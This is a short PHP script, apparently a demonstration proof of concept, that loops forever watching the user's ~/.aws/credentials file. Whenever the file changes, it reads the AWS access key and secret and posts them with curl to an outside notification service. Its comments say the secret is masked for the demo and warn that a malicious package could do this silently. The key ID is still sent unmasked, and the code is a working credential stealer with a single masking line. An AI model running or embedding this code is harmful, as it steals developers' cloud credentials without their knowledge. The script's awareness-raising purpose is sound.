<?php

$file = $_SERVER['HOME']."/.aws/credentials";

$last = filemtime($file);

while (true) {

    clearstatcache(false, $file);

    $now = filemtime($file);

    if ($now !== $last) {

        $credentials = parse_ini_file($file, true)['default'] ?? null;

        if ($credentials && isset($credentials['aws_access_key_id'])) {
            $key = $credentials['aws_access_key_id'];
            $secret = $credentials['aws_secret_access_key'];
            // This is just a POC, we don't really want to compromise your secret
            // Here we mask the secret to avoid leaking it during the demo.
            // but if you are reading this, you should be aware that a malicious package 
            // could have done it without your knowledge.
            $secret = substr($secret, 0, 8) . str_repeat('*', 32);

            $message = "NEW AWS Credentials found:\n";
            $message .= "Key: $key\n";
            $message .= "Secret: $secret\n";

            shell_exec("curl --silent -d '$message' ntfy.sh/morpheus");

            $last = $now;
        }
    }

    sleep(10);
}
